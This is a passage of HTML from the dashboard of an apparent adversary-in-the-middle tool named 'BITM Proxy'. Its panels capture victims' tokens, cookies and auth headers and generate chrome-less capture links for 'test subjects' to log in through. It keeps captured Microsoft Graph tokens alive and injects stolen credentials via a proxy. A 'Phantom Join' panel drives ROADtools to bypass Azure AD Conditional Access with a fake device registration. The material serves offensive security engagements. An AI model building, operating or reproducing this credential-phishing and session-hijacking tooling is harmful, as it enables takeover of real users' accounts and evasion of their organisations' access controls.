.c-tool{color:#a5b4fc;font-weight:600}
.c-config{color:#c084fc}
.btn.running{background:#1e293b;color:#94a3b8;cursor:wait;position:relative}
.btn.running::after{content:"";position:absolute;right:6px;top:50%;width:10px;height:10px;margin-top:-5px;border:2px solid #60a5fa;border-top-color:transparent;border-radius:50%;animation:spin 0.8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.c-default{color:#94a3b8}

.data-panel{background:#0a0a1a;flex:1;overflow-y:auto;padding:16px}
.data-panel pre{font-family:inherit;white-space:pre-wrap;word-break:break-all}
.card{background:#1a1a2e;border:1px solid #333;border-radius:6px;margin-bottom:8px;overflow:hidden}
.card-header{padding:10px 12px;display:flex;align-items:center;justify-content:space-between;cursor:pointer}
.card-header:hover{background:#1e1e36}
.card-body{padding:0 12px 12px;font-size:13px}

.stats{display:flex;gap:12px;padding:6px 12px}
.stat{font-size:13px;color:#94a3b8}
.stat b{color:#ccc}
</style>
</head>
<body>

<div class="header">
  <h1>Debug Dashboard</h1>
  <span id="ws-badge" class="badge badge-dead">connecting</span>
  <span style="flex:1"></span>
  <div class="header-launch">
    <button class="btn" onclick="launchBitmProxy()">Launch</button>
    <button class="btn" style="border-color:#a855f7;background:#3b1f6e;color:#c4b5fd" onclick="launchBitmProxy(true)">Private</button>
  </div>
  <div class="stats">
    <span class="stat">Tok:<b id="st-tok">0</b></span>
    <span class="stat">Ck:<b id="st-ck">0</b></span>
    <span class="stat">Auth:<b id="st-au">0</b></span>
    <span class="stat">In:<b id="st-inp">0</b></span>
  </div>
  <span style="color:#8893a7;font-size:13px">:8092</span>
</div>

<div class="tab-bar" id="sessions-bar" style="border-bottom:1px solid #222;min-height:0"></div>
<div id="flag-banner" style="display:none;background:#3f1111;border-bottom:1px solid #7f1d1d;color:#fca5a5;padding:6px 16px;font-size:13px;display:none;align-items:center;gap:10px"></div>
<div class="tab-bar" id="tab-bar"></div>

<div class="content">
  <div class="data-panel" id="panel-settings" style="display:none;padding:0;flex-direction:column;height:100%">
    <div class="settings-layout">
      <div class="settings-nav">
        <button class="settings-tab active" data-pane="config" onclick="settingsSubtab('config')">Configuration</button>
        <button class="settings-tab" data-pane="browser" onclick="settingsSubtab('browser')">Browser</button>
        <button class="settings-tab" data-pane="fingerprint" onclick="settingsSubtab('fingerprint')">Fingerprint</button>
        <button class="settings-tab" data-pane="urls" onclick="settingsSubtab('urls')">Login URLs</button>
        <button class="settings-tab" data-pane="filter" onclick="settingsSubtab('filter')">Request Filter</button>
        <button class="settings-tab" data-pane="logging" onclick="settingsSubtab('logging')">Logging</button>
        <button class="settings-tab" data-pane="slack" onclick="settingsSubtab('slack')">Slack</button>
        <button class="settings-tab" data-pane="integrations" onclick="settingsSubtab('integrations')">Flow / RAG / Ollama</button>
        <button class="settings-tab" data-pane="performance" onclick="settingsSubtab('performance')">Performance</button>
        <button class="settings-tab" data-pane="keepalive" onclick="settingsSubtab('keepalive')">Keep-Alive</button>
        <button class="settings-tab" data-pane="proxy" onclick="settingsSubtab('proxy')">Proxy</button>
        <button class="settings-tab" data-pane="diagnostics" onclick="settingsSubtab('diagnostics')">Diagnostics</button>
        <button class="settings-tab" data-pane="danger" onclick="settingsSubtab('danger')">Danger Zone</button>
      </div>
      <div class="settings-content">
        <div class="settings-pane" data-pane="config">
          <h2>Configuration</h2>
          <div id="cfg"></div>
          <div style="margin-top:12px"><button class="btn" onclick="saveConfig()">Apply</button></div>
        </div>
        <div class="settings-pane" data-pane="urls" style="display:none">
          <h2>Default Login URL</h2>
          <p style="color:#94a3b8;font-size:13px;margin-bottom:10px">Click a preset to set it as the default login URL, or add a new one.</p>
          <div id="url-presets" style="display:flex;flex-wrap:wrap"></div>
        </div>
        <div class="settings-pane" data-pane="filter" style="display:none">
          <h2>Request Filter</h2>
          <p style="color:#94a3b8;font-size:13px;margin-bottom:10px">URLs whose path ends in one of these extensions are filtered from logs and flow capture.</p>
          <div id="noisy-exts" style="display:flex;flex-wrap:wrap;gap:2px"></div>
          <div style="display:flex;gap:6px;margin-top:10px;max-width:320px">
            <input id="add-ext-input" class="cfg-input" style="flex:1" placeholder=".ext">
            <button class="btn" style="padding:3px 10px" onclick="addNoisyExt()">Add</button>
          </div>
        </div>
        <div class="settings-pane" data-pane="browser" style="display:none">
          <h2>Browser</h2>
          <div id="browser-cfg"></div>
          <div style="margin-top:12px"><button class="btn" onclick="saveConfig()">Apply</button></div>
        </div>
        <div class="settings-pane" data-pane="fingerprint" style="display:none">
          <h2>Fingerprint</h2>
          <p style="color:#94a3b8;font-size:13px;margin:0 0 12px 0">All UA / Sec-CH-UA-* / TLS-impersonation / device-probe / DRS settings in one place. See the Docs tab → <i>Device fingerprinting &amp; profiles</i> for the mechanism, and <code>docs/AUTH_FLOWS.md</code> for the YAML side.</p>
          <div id="fingerprint-cfg"></div>
          <div style="margin-top:12px"><button class="btn" onclick="saveConfig()">Apply</button></div>
        </div>
        <div class="settings-pane" data-pane="integrations" style="display:none">
          <h2>Flow Trace · RAG · Ollama</h2>
          <div id="integrations-cfg"></div>
        </div>
        <div class="settings-pane" data-pane="logging" style="display:none">
          <h2>Logging</h2>
          <div id="logging-cfg"></div>
          <div style="margin-top:12px"><button class="btn" onclick="saveConfig()">Apply</button></div>
          <h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin:18px 0 8px">File Logging</h3>
          <div id="log-file-info" style="font-size:13px;color:#94a3b8"></div>
        </div>
        <div class="settings-pane" data-pane="slack" style="display:none">
          <h2>Slack Notifications</h2>
          <div id="slack-cfg"></div>
          <div style="margin-top:12px"><button class="btn" onclick="saveConfig()">Apply</button></div>
        </div>
        <div class="settings-pane" data-pane="performance" style="display:none">
          <h2>Performance</h2>
          <p style="color:#94a3b8;font-size:13px;margin-bottom:10px">One-click presets that adjust several tunables together, plus individual knobs below. Changes persist across restarts.</p>

          <h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin:14px 0 6px">Presets</h3>
          <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px">
            <button class="btn" style="padding:6px 14px" onclick="applyPerfPreset('low')" title="Minimum fidelity. Low screenshot rate, small log backlog, images disabled in Chromium. Best for 15+ concurrent sessions.">Low fidelity</button>
            <button class="btn" style="padding:6px 14px" onclick="applyPerfPreset('balanced')" title="Default. 3 fps screenshots, 500-line log backlog, images on.">Balanced</button>
            <button class="btn" style="padding:6px 14px" onclick="applyPerfPreset('high')" title="High fidelity. 5 fps screenshots, 2000-line backlog, higher JPEG quality.">High fidelity</button>
            <span style="flex:1"></span>
            <button class="btn" style="padding:4px 10px;font-size:12px;border-color:#475569;color:#cbd5e1" onclick="refreshPerfMetrics()" title="Pull /api/metrics and display pool + bus counters">Refresh metrics</button>
          </div>
          <div id="perf-preset-summary" style="color:#64748b;font-size:12px;margin-bottom:16px"></div>

          <h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin:14px 0 6px">Session stream (:8091)</h3>
          <div id="perf-cfg-stream"></div>

          <h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin:14px 0 6px">Dashboard stream (:8092)</h3>
          <div id="perf-cfg-dashboard"></div>

          <h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin:14px 0 6px">Worker pool</h3>
          <div id="perf-cfg-pool"></div>
          <div style="color:#64748b;font-size:12px;margin-top:4px">Changes to <code>workers_enabled</code> / <code>worker_count</code> / <code>worker_sessions_max</code> take effect on the next stack restart.</div>

          <h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin:16px 0 6px">Live metrics</h3>
          <div id="perf-metrics" style="font-size:12px;font-family:'SF Mono',ui-monospace,monospace;background:#0a0a14;border:1px solid #1f2937;padding:10px 12px;border-radius:4px;color:#cbd5e1">click <i>Refresh metrics</i> above</div>
        </div>

        <div class="settings-pane" data-pane="keepalive" style="display:none">
          <h2>Token Keep-Alive</h2>
          <p style="color:#94a3b8;font-size:13px;margin:0 0 12px 0">Background loop that validates captured tokens against MS Graph and refreshes expiring sessions. All keepalive-related knobs (cycle cadence, debug tracing, failure thresholds, the SPA Playwright fallback) live here.</p>
          <div style="display:flex;gap:6px;align-items:center;margin-bottom:14px">
            <span id="ka-badge" class="badge badge-dead" style="font-size:13px">stopped</span>
            <span style="flex:1"></span>
            <button class="btn" style="padding:3px 10px;font-size:13px" onclick="startKeepalive()">Start</button>
            <button class="btn btn-danger" style="padding:3px 10px;font-size:13px" onclick="stopKeepalive()">Stop</button>
          </div>
          <div id="ka-info" style="font-size:13px;color:#94a3b8;margin-bottom:14px"></div>

          <div id="ka-config"></div>
          <div style="margin-top:12px"><button class="btn" onclick="saveConfig()">Apply</button></div>
        </div>
        <div class="settings-pane" data-pane="proxy" style="display:none">
          <h2>Proxy</h2>
          <div style="background:#92400e;border:1px solid #b45309;border-radius:6px;padding:10px 16px;margin-bottom:16px;display:flex;align-items:center;gap:10px">
            <span style="font-size:18px">&#9888;</span>
            <div>
              <div style="color:#fbbf24;font-weight:700;font-size:13px">In Development</div>
              <div style="color:#fcd34d;font-size:13px">Proxy features are experimental and may change.</div>
            </div>
          </div>

          <h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin:14px 0 8px">Upstream Proxy Configuration</h3>
          <div id="proxy-cfg" style="margin-bottom:16px"></div>
          <div style="margin-bottom:16px"><button class="btn" onclick="saveConfig()">Apply</button></div>

          <h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin:14px 0 8px">Test Upstream Connection</h3>
          <div style="margin-bottom:8px;font-size:13px;color:#94a3b8" id="upstream-host-display"></div>
          <button class="btn" style="font-size:13px;padding:6px 16px;margin-bottom:8px" onclick="testUpstreamProxy()">Test Connection</button>
          <div id="upstream-test-result" style="font-size:13px;margin-bottom:20px"></div>

          <h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin:14px 0 8px">Built-in Test Proxy</h3>
          <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px">
            <label style="font-size:13px;color:#cbd5e1">Listen Port</label>
            <input id="proxy-port" class="cfg-input" type="number" value="3129" min="3100" max="3199" style="width:80px">
            <span style="flex:1"></span>
            <span id="proxy-badge" class="badge badge-dead" style="font-size:13px">stopped</span>
          </div>
          <div style="display:flex;gap:8px;margin-bottom:8px;max-width:400px">
            <button class="btn" style="flex:1;padding:6px" onclick="startProxy()">Start Proxy</button>
            <button class="btn btn-danger" style="flex:1;padding:6px" onclick="stopProxy()">Stop Proxy</button>
          </div>
          <div style="font-size:13px;color:#78859b" id="proxy-info"></div>

          <div style="border-top:1px solid #333;margin-top:20px;padding-top:16px">
            <h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px">Auth Proxy <span style="color:#78859b;font-weight:normal;text-transform:none">(credential injection)</span></h3>
            <div style="font-size:13px;color:#8893a7;margin-bottom:12px">HTTP/HTTPS proxy that auto-injects captured cookies &amp; tokens into matching requests. Configure your browser/tool to use <code>localhost:&lt;port&gt;</code> as the proxy.</div>
            <div style="display:flex;gap:8px;align-items:center;margin-bottom:4px">
              <label style="font-size:13px;color:#cbd5e1">Port</label>
              <input id="auth-proxy-port" class="cfg-input" type="number" value="3128" min="3100" max="3199" style="width:80px">
              <span style="flex:1"></span>
              <span id="auth-proxy-badge" class="badge badge-dead" style="font-size:13px">stopped</span>
            </div>
            <div style="color:#78859b;font-size:12px;margin-bottom:8px">Valid range: <b>3100–3199</b> (published to your host). Default <b>3128</b>.</div>
            <div style="background:#0a0a14;border:1px solid #222;border-radius:4px;padding:8px 10px;margin-bottom:8px;display:flex;align-items:center;gap:10px">
              <label class="toggle"><input type="checkbox" id="pvp-toggle" onchange="cfgSet('proxy_via_playwright',this.checked);saveConfig()"><span class="sl"></span></label>
              <div style="flex:1">
                <div style="font-size:13px;color:#cbd5e1;font-weight:600">Route requests through a Playwright session</div>
                <div style="font-size:12px;color:#8893a7">When on, requests through <code>:3128</code> are fetched via the most recent active Playwright session on <code>:8091</code> (inheriting its cookies/auth). The Playwright response is returned to the proxy client. Falls back to direct fetch if no session is active.</div>
              </div>
            </div>
            <div style="display:flex;gap:8px;margin-bottom:8px;max-width:400px">
              <button class="btn" style="flex:1;padding:6px;background:#1e3a5f" onclick="startAuthProxy()">Start Auth Proxy</button>
              <button class="btn btn-danger" style="flex:1;padding:6px" onclick="stopAuthProxy()">Stop Auth Proxy</button>
            </div>
            <div id="auth-proxy-info" style="font-size:13px;color:#78859b;margin-bottom:8px"></div>
            <div id="auth-proxy-ca" style="font-size:13px;margin-bottom:8px;display:none"></div>

            <details style="margin:8px 0;border:1px solid #1e293b;border-radius:4px;padding:8px 12px;background:#0a0a14">
              <summary style="color:#94a3b8;font-size:13px;cursor:pointer;font-weight:600">Custom CA cert (replace the auto-generated one)</summary>
              <div style="padding:10px 0">
                <p style="color:#94a3b8;font-size:12px;margin:0 0 8px 0">Upload your own CA cert + private key (PEM format) to replace the auto-generated BITM CA. Useful when you have an org-installed root that subjects already trust, or when you want a CA chain you control. Validates that the key matches the cert and that <code>BasicConstraints CA:TRUE</code> is set.</p>
                <div id="ca-current" style="margin-bottom:10px;font-size:12px"></div>
                <div style="display:grid;grid-template-columns:auto 1fr;gap:8px;align-items:center;font-size:13px">
                  <label style="color:#94a3b8">CA cert (.crt / .pem)</label>
                  <input type="file" id="ca-cert-file" accept=".crt,.pem,.cer" style="font-size:12px">
                  <label style="color:#94a3b8">Private key (.key / .pem)</label>
                  <input type="file" id="ca-key-file" accept=".key,.pem" style="font-size:12px">
                </div>
                <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap">
                  <button class="btn" style="padding:4px 12px;font-size:13px;background:#7c2d12;color:#fed7aa;border-color:#c2410c" onclick="uploadCa()">Upload &amp; replace</button>
                  <button class="btn" style="padding:4px 12px;font-size:13px" onclick="downloadCa()">Download current CA</button>
                  <button class="btn btn-danger" style="padding:4px 12px;font-size:13px" onclick="resetCa()">Reset (regenerate)</button>
                  <button class="btn" style="padding:4px 12px;font-size:13px" onclick="refreshCaInfo()">Refresh</button>
                </div>
                <div id="ca-result" style="margin-top:8px;font-size:12px"></div>
              </div>
            </details>
            <details style="margin-top:8px">
              <summary style="color:#94a3b8;font-size:13px;cursor:pointer">Setup instructions</summary>
              <div style="padding:8px;font-size:13px;color:#94a3b8;line-height:1.6">
                <div style="color:#7dd3fc;font-weight:600;margin-bottom:4px">1. Start the proxy above</div>
                <div style="color:#7dd3fc;font-weight:600;margin-bottom:4px">2. Configure your tool to use the proxy:</div>
                <pre style="background:#0a0a14;padding:6px;border-radius:4px;color:#cbd5e1;margin:4px 0">
# curl
curl --proxy http://localhost:3128 https://example.com

# PowerShell
$env:HTTP_PROXY="http://localhost:3128"
$env:HTTPS_PROXY="http://localhost:3128"

# Browser: Settings → Proxy → Manual → localhost:3128

# Python requests
import requests
requests.get("https://example.com",
    proxies={"http":"http://localhost:3128","https":"http://localhost:3128"},
    verify=False)
                </pre>
                <div style="color:#7dd3fc;font-weight:600;margin-bottom:4px">3. For HTTPS injection: install the CA cert</div>
                <div>The proxy generates a CA cert for BITM. Install it as a trusted root:</div>
                <pre style="background:#0a0a14;padding:6px;border-radius:4px;color:#cbd5e1;margin:4px 0" id="auth-proxy-ca-path">Start the proxy to see the CA cert path</pre>
                <div style="color:#f87171;margin-top:4px">Without the CA cert, HTTPS sites will show certificate warnings. Use <code>verify=False</code> or <code>-k</code> to bypass.</div>
              </div>
            </details>
          </div>

          <div style="border-top:1px solid #333;margin-top:20px;padding-top:16px">
            <h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px">Generate capture links <span style="color:#78859b;font-weight:normal;text-transform:none">(seamless popout on :8091)</span></h3>
            <div style="font-size:13px;color:#8893a7;margin-bottom:10px">One link per configured login URL (edit in <b>Login URLs</b> tab). Hand any to a test subject — each opens a Playwright session on :8091 with <b>no dashboard chrome</b>. Target site renders full-window, tab title mirrors the live page, every request/response is captured to the Flow Trace tab.</div>
            <div id="cap-link-list" style="margin-bottom:16px"></div>
            <div style="border-top:1px dashed #333;padding-top:12px;margin-top:8px">
              <div style="font-size:12px;color:#94a3b8;margin-bottom:6px">Or generate for a one-off target:</div>
              <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px;flex-wrap:wrap">
                <input id="cap-link-target" class="cfg-input cfg-input-wide" style="flex:1;min-width:280px" type="text" placeholder="https://login.microsoftonline.com">
                <button class="btn" onclick="generateCaptureLink()">Generate</button>
              </div>
              <div id="cap-link-custom-output" style="display:none;flex-wrap:wrap;gap:8px;align-items:center;margin-bottom:8px">
                <input id="cap-link-output" class="cfg-input cfg-input-wide" style="flex:1" type="text" readonly>
                <button class="btn" onclick="copyCaptureLink()">Copy</button>
                <button class="btn" onclick="openCaptureLink()">Open</button>
              </div>
              <div id="cap-link-note" style="font-size:12px;color:#78859b"></div>
            </div>
          </div>

          <div style="border-top:1px solid #333;margin-top:20px;padding-top:16px">
            <h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px">Hydrate Playwright session from proxy capture <span style="color:#78859b;font-weight:normal;text-transform:none">(no restart)</span></h3>
            <div style="font-size:13px;color:#8893a7;margin-bottom:12px">Browse through <code>localhost:3128</code> on your desktop browser. The proxy captures Set-Cookie + Authorization + CSRF per hostname. Pick a captured host and a running Playwright session below, and click <b>Hydrate</b> — cookies + extra headers are injected into the Playwright context without restarting it, and the browser navigates to the last URL seen on the proxy.</div>
            <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px;flex-wrap:wrap">
              <label style="font-size:13px;color:#cbd5e1">Captured host</label>
              <select id="hydrate-host-select" class="cfg-input" style="width:auto;min-width:220px"></select>
              <button class="btn" style="padding:3px 10px;font-size:13px" onclick="refreshHydrateList()">Refresh</button>
            </div>
            <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px;flex-wrap:wrap">
              <label style="font-size:13px;color:#cbd5e1">Into session</label>
              <select id="hydrate-sid-select" class="cfg-input" style="width:auto;min-width:220px"></select>
              <label style="font-size:13px;color:#cbd5e1;margin-left:8px"><input id="hydrate-navigate" type="checkbox" checked> Navigate to captured URL</label>
            </div>
            <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px">
              <button class="btn" style="padding:5px 14px" onclick="hydrateSession()">Hydrate</button>
              <span id="hydrate-result" style="font-size:13px"></span>
            </div>
          </div>
        </div>
        <div class="settings-pane" data-pane="diagnostics" style="display:none">
          <h2>Diagnostics <span style="font-size:13px;font-weight:400;color:#6e7681;margin-left:6px">BITM Proxy v__APP_VERSION__</span></h2>
          <p style="color:#94a3b8;font-size:13px;margin-bottom:10px">Runs read-only checks across the container to show what's actually happening. Use this when a proxy isn't showing logs, a tab looks empty, or something's "bypassing" the BITM. Re-run anytime.</p>
          <div style="display:flex;gap:8px;align-items:center;margin-bottom:14px">
            <button class="btn" onclick="runDiagnostics()">Run checks</button>
            <span id="diag-summary" style="font-size:13px;color:#78859b"></span>
          </div>
          <div id="diag-results"></div>
        </div>
        <div class="settings-pane" data-pane="danger" style="display:none">
          <h2>Danger Zone</h2>
          <p style="color:#94a3b8;font-size:13px;margin-bottom:10px">Wipes all captured credentials, cookies, headers, and session data. Does not stop active sessions.</p>
          <button class="btn btn-danger" style="padding:6px 16px" onclick="clearAllSensitive()">Clear All Sensitive Data</button>
        </div>
      </div>
    </div>
  </div>

  <div class="data-panel" id="panel-docs" style="display:none;overflow-y:auto;padding:20px 32px;max-width:900px">
    <h1 style="color:#7dd3fc;margin-bottom:16px">BITM Proxy — Docs</h1>
    <div id="docs-content"></div>
  </div>

  <div class="data-panel" id="panel-flow" style="display:none;flex-direction:column;padding:0;height:100%">
    <div class="flow-toolbar">
      <select id="flow-sid-select" class="cfg-input" style="width:auto;min-width:200px" onchange="setPinnedSid(this.value);renderFlow()"></select>
      <span id="flow-count" style="color:#78859b;font-size:13px">0 exchanges</span>
      <input id="flow-search" class="cfg-input" placeholder="search url / headers / body…" style="width:220px" oninput="renderFlow()">
      <button class="btn" style="padding:3px 8px;font-size:13px" onclick="flowPrevFlagged()" title="Jump to previous red-dotted (flagged) transaction">◀ dot</button>
      <button class="btn" style="padding:3px 8px;font-size:13px" onclick="flowNextFlagged()" title="Jump to next red-dotted (flagged) transaction">dot ▶</button>
      <label style="color:#94a3b8;font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer" title="Restrict timeline to flagged rows plus ±3 rows of context">
        <input type="checkbox" id="flow-only-flagged" onchange="renderFlow()"> only flagged ±3
      </label>
      <span style="flex:1"></span>
      <span id="flow-sel-info" style="color:#60a5fa;font-size:12px"></span>
      <button class="btn" style="padding:3px 10px;font-size:13px" onclick="flowSelectAllVisible()" title="Check every currently-visible row">Select visible</button>
      <button class="btn" style="padding:3px 10px;font-size:13px" onclick="flowClearSelection()" title="Uncheck everything">Clear selection</button>
      <button class="btn" style="padding:3px 10px;font-size:13px;border-color:#22c55e;background:#064e3b;color:#86efac" onclick="markFlow('start')" title="Mark the most recent exchange as the start of the login flow">Mark start</button>
      <button class="btn" style="padding:3px 10px;font-size:13px;border-color:#ef4444;background:#3f1111;color:#fca5a5" onclick="markFlow('end')" title="Mark the most recent exchange as the end of the login flow">Mark login complete</button>
      <button class="btn" style="padding:3px 10px;font-size:13px" onclick="clearMarkers()" title="Remove start/end markers">Clear markers</button>
      <span id="flow-marker-info" style="color:#78859b;font-size:12px"></span>
      <button class="btn" style="padding:3px 10px;font-size:13px" onclick="clearFlow()">Clear flow</button>
      <button class="btn" style="padding:3px 10px;font-size:13px;border-color:#0ea5e9;color:#7dd3fc" onclick="reclassifyFlow()" title="Force re-running auth_milestones.classify on every row of this session — useful after editing config/sites.yaml or to backfill rows captured before the classifier shipped.">Reclassify milestones</button>
      <button class="btn" style="padding:3px 10px;font-size:13px" onclick="submitFlowToRag()" title="Uses checked rows if any, else the marker range">Send to RAG</button>
      <button class="btn" style="padding:3px 10px;font-size:13px;border-color:#ef4444;color:#fca5a5" onclick="clearRagFindings()" title="Clear all findings you've imported into the built-in RAG engine via 'Send to RAG'. Captured flow traces are NOT deleted — they still auto-surface in RAG.">Clear RAG data</button>
      <select id="analyze-preset" class="cfg-input" style="width:auto;border-color:#a855f7;color:#c4b5fd;background:#3b1f6e" title="Pick the analysis prompt the LLM will use">
        <option value="general">Analyze: General</option>
        <option value="sso">Analyze: SSO (identify protocol + stages)</option>
        <option value="saml">Analyze: SAML (assertion / RelayState)</option>
        <option value="oidc">Analyze: OIDC / OAuth2 (code / id_token)</option>
        <option value="troubleshoot">Analyze: Troubleshoot (diagnose failure)</option>
      </select>
      <button class="btn" style="padding:3px 10px;font-size:13px;border-color:#a855f7;background:#3b1f6e;color:#c4b5fd" onclick="analyzeFlow()" title="Uses checked rows if any, else the marker range">Run</button>
      <span style="border-left:1px solid #222;margin:0 2px;height:20px"></span>
      <button class="btn" style="padding:3px 10px;font-size:13px;border-color:#64748b;color:#cbd5e1" onclick="debugDumpDom()" title="Save the current page's rendered HTML to data/debug/. Useful for seeing which form elements a tricky MFA page actually exposes.">Dump DOM</button>
      <button class="btn" style="padding:3px 10px;font-size:13px;border-color:#64748b;color:#cbd5e1" onclick="debugListFrames()" title="List every frame + its forms/inputs/buttons. Helps spot MFA widgets hidden in an iframe.">Frames</button>
      <button class="btn" style="padding:3px 10px;font-size:13px;border-color:#64748b;color:#cbd5e1" onclick="debugExportFlow()" title="Download the full flow (req+resp headers + bodies) to your browser as HAR or JSON. HAR imports directly into Burp Suite / browser devtools.">Export Flow</button>
    </div>
    <div id="flow-reclassify-banner" style="display:none;padding:8px 12px;border-bottom:1px solid #1e3a5f;background:#0a1525;font-size:12px;color:#cbd5e1;line-height:1.5"></div>
    <div class="flow-layout">
      <div class="flow-timeline" id="flow-timeline"></div>
      <div class="flow-detail" id="flow-detail"><div style="color:#78859b;font-size:13px;padding:20px;text-align:center">Select a row on the left to see request/response details.</div></div>
      <div class="flow-taint" id="flow-taint"></div>
    </div>
  </div>

  <div class="data-panel" id="panel-index" style="display:none;flex-direction:column;padding:0;height:100%">
    <div class="flow-toolbar">
      <select id="idx-sid-select" class="cfg-input" style="width:auto;min-width:200px" onchange="setPinnedSid(this.value);renderIndex()"></select>
      <span id="idx-count" style="color:#78859b;font-size:13px">0 items</span>
      <span style="flex:1"></span>
      <label style="color:#94a3b8;font-size:12px;display:flex;align-items:center;gap:4px" title="Only include transactions within the Flow Trace start/end markers">
        <input type="checkbox" id="idx-markers-only" onchange="renderIndex()"> within login markers
      </label>
      <label style="color:#94a3b8;font-size:12px;display:flex;align-items:center;gap:4px">
        dir:
        <select id="idx-direction" class="cfg-input" style="width:auto" onchange="renderIndex()">
          <option value="all">all</option>
          <option value="req">requests only</option>
          <option value="resp">responses only</option>
        </select>
      </label>
      <label style="color:#94a3b8;font-size:12px;display:flex;align-items:center;gap:4px" title="Top-level grouping for the index rows">
        group by:
        <select id="idx-groupby" class="cfg-input" style="width:auto" onchange="renderIndex()">
          <option value="name">name</option>
          <option value="site">site (hostname)</option>
        </select>
      </label>
      <label style="color:#94a3b8;font-size:12px;display:flex;align-items:center;gap:4px" title="Restrict to items observed on this site. 'any' = no filter.">
        site:
        <select id="idx-site-filter" class="cfg-input" style="width:auto;min-width:160px" onchange="renderIndex()">
          <option value="">any</option>
        </select>
      </label>
      <label style="color:#94a3b8;font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer">
        <input type="checkbox" id="idx-show-ignored" onchange="renderIndex()"> show ignored
      </label>
      <button class="btn" style="padding:3px 10px;font-size:13px" onclick="toggleIgnoreManager()">Manage ignore list</button>
      <button class="btn" style="padding:3px 10px;font-size:13px" onclick="idxExpandAll()" title="Expand every name group in every section">Expand all</button>
      <button class="btn" style="padding:3px 10px;font-size:13px" onclick="idxCollapseAll()" title="Collapse every name group — only headers visible">Collapse all</button>
      <button class="btn" style="padding:3px 10px;font-size:13px;border-color:#ef4444;color:#fca5a5" onclick="idxClearFlags()" title="Uncheck every flagged item">Clear flags</button>
      <input id="idx-search" class="cfg-input" placeholder="filter by name or value…" style="width:240px" oninput="renderIndex()">
      <button class="btn" style="padding:3px 10px;font-size:13px" onclick="refreshIndexSessionList()">Refresh</button>
    </div>
    <div id="idx-ignore-manager" style="display:none;background:#0a0a14;border-bottom:1px solid #1f2937;padding:10px 14px;font-size:12px"></div>
    <div class="idx-layout">
      <div class="idx-sections" id="idx-sections"></div>
      <div class="idx-detail" id="idx-detail"><div style="color:#78859b;font-size:13px;padding:10px">Click an item to see its occurrences and skip through transactions.</div></div>
    </div>
  </div>

  <div class="data-panel" id="panel-phantom" style="display:none;flex-direction:column;padding:0;height:100%">
    <div style="padding:14px 18px;border-bottom:1px solid #222;background:#10131c">
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:6px">
        <h2 style="font-size:14px;color:#fbbf24;margin:0">⚡ Phantom Join</h2>
        <span style="color:#78859b;font-size:12px">Azure AD CA bypass via phantom device — authorized engagements only</span>
        <span style="flex:1"></span>
        <span id="phantom-status-pill" style="font-size:12px;color:#78859b"></span>
      </div>
      <div style="color:#94a3b8;font-size:12px;line-height:1.5">
        Drives <code>tools/phantom_runner.py</code> which orchestrates ROADtools (<code>roadtx</code>, <code>roadrecon</code>) through the 9-phase chain documented by Cyderes Howler Cell. Mutates AAD tenant state (registers a device, possibly enrolls in Intune). Logs land under <code>$DATA_DIR/phantom/</code>.
      </div>
    </div>
    <div style="display:flex;flex:1;min-height:0">
      <div style="width:340px;border-right:1px solid #222;padding:14px 16px;overflow-y:auto">
        <div style="font-size:13px;color:#cbd5e1;margin-bottom:10px;font-weight:600">Run parameters</div>
        <div class="config-row"><label style="color:#94a3b8">Username (UPN)</label><input id="phantom-user" class="cfg-input cfg-input-wide" placeholder="user@target.com"></div>
        <div class="config-row"><label style="color:#94a3b8">Password</label><input id="phantom-pass" type="password" class="cfg-input cfg-input-wide"></div>
        <div class="config-row"><label style="color:#94a3b8">Domain</label><input id="phantom-domain" class="cfg-input cfg-input-wide" placeholder="target.com"></div>
        <div class="config-row"><label style="color:#94a3b8">Device name</label><input id="phantom-devname" class="cfg-input cfg-input-wide" placeholder="(auto-generated)"></div>
        <div class="config-row"><label style="color:#94a3b8" title="OS platform the phantom device registers as. A non-Windows join probes platform-scoped Conditional Access / Intune compliance that a Windows join wouldn't hit.">Device type</label><select id="phantom-devtype" class="cfg-input" style="width:130px"><option value="Windows" selected>Windows</option><option value="macOS">macOS</option><option value="iOS">iOS</option><option value="Android">Android</option></select></div>
        <div class="config-row"><label style="color:#94a3b8" title="Registered OS version; leave blank for roadtx's default">OS version</label><input id="phantom-osver" class="cfg-input" style="width:130px" placeholder="(roadtx default)"></div>
        <hr style="border:none;border-top:1px solid #222;margin:10px 0">
        <div class="config-row"><label style="color:#94a3b8">Start phase</label><input id="phantom-start" type="number" min="1" max="9" value="1" class="cfg-input" style="width:80px"></div>
        <div class="config-row"><label style="color:#94a3b8">Stop phase</label><input id="phantom-stop" type="number" min="1" max="9" placeholder="(no cap)" class="cfg-input" style="width:80px"></div>
        <div class="config-row"><label style="color:#94a3b8">Force on failure</label><label class="toggle"><input type="checkbox" id="phantom-force"><span class="sl"></span></label></div>
        <div class="config-row"><label style="color:#94a3b8" title="Show every roadtx/roadrecon command without executing — safe to use for plan inspection">Dry run</label><label class="toggle"><input type="checkbox" id="phantom-dry" checked><span class="sl"></span></label></div>
        <hr style="border:none;border-top:1px solid #222;margin:10px 0">
